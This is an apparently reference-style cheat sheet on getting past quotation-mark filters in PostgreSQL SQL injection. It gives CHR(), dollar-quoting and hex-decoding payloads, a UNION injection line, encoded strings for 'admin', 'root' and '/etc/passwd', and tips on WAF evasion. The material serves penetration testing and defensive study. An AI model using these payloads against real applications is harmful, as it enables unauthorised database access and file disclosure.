---
title: Avoiding Quotations
description: Techniques to avoid using quotes in PostgreSQL injection
category: Injection Techniques
order: 10
tags: ["quotes", "evasion", "bypass"]
lastUpdated: 2025-12-07
---

## Avoiding Quotations

In some scenarios, web applications may implement filters that block or sanitize quotation marks (`'` or `"`). These techniques allow you to construct strings without using quotes.

### Using CHR() Function

The `CHR()` function converts ASCII values to characters:

```sql
-- 'admin' using CHR()
SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);
-- Result: 'admin'

-- Build any string character by character
SELECT CHR(65);  -- 'A'
SELECT CHR(66);  -- 'B'
```

### Using String Concatenation

Combine `CHR()` with the `||` concatenation operator:

```sql
-- Build 'root' without quotes
SELECT CHR(114)||CHR(111)||CHR(111)||CHR(116);

-- Complex strings
SELECT CHR(47)||CHR(101)||CHR(116)||CHR(99)||CHR(47)||CHR(112)||CHR(97)||CHR(115)||CHR(115)||CHR(119)||CHR(100);
-- Result: '/etc/passwd'
```

### Using Dollar-Quoting

PostgreSQL supports dollar-quoting as an alternative to single quotes:

```sql
-- Instead of 'admin'
SELECT $$admin$$;

-- With custom tag
SELECT $tag$admin$tag$;

-- This can bypass simple quote filters
SELECT * FROM users WHERE username = $$admin$$;
```

### Using Hexadecimal

PostgreSQL can convert hex to text:

```sql
-- Using encode/decode
SELECT convert_from(decode('61646d696e', 'hex'), 'UTF8');
-- Result: 'admin'

-- Using E'\x' escape syntax
SELECT E'\x61\x64\x6d\x69\x6e';
-- Result: 'admin'
```

### Using ASCII Values with Bit Operations

```sql
-- Get ASCII value
SELECT ASCII('A');  -- Returns 65

-- Convert back to character
SELECT CHR(65);  -- Returns 'A'
```

### Injection Examples

```sql
-- Original query using quotes
SELECT * FROM users WHERE username='admin';

-- Using CHR() to avoid quotes
SELECT * FROM users WHERE username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);

-- Using dollar-quoting
SELECT * FROM users WHERE username=$$admin$$;

-- In UNION injection
' UNION SELECT NULL,CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110),NULL--
```

### Building Common Strings

| String        | CHR() Equivalent                                                                                                                                                                                               |
| ------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `admin`       | `CHR(97)&#124;&#124;CHR(100)&#124;&#124;CHR(109)&#124;&#124;CHR(105)&#124;&#124;CHR(110)`                                                                                                                      |
| `root`        | `CHR(114)&#124;&#124;CHR(111)&#124;&#124;CHR(111)&#124;&#124;CHR(116)`                                                                                                                                         |
| `/etc/passwd` | `CHR(47)&#124;&#124;CHR(101)&#124;&#124;CHR(116)&#124;&#124;CHR(99)&#124;&#124;CHR(47)&#124;&#124;CHR(112)&#124;&#124;CHR(97)&#124;&#124;CHR(115)&#124;&#124;CHR(115)&#124;&#124;CHR(119)&#124;&#124;CHR(100)` |

### Notes

- `CHR()` is the PostgreSQL equivalent of MySQL's `CHAR()`
- Dollar-quoting is PostgreSQL-specific and very useful for bypass
- The `||` operator is used for concatenation (not `+` or `CONCAT()`)
- These techniques are useful for bypassing WAFs and quote filters
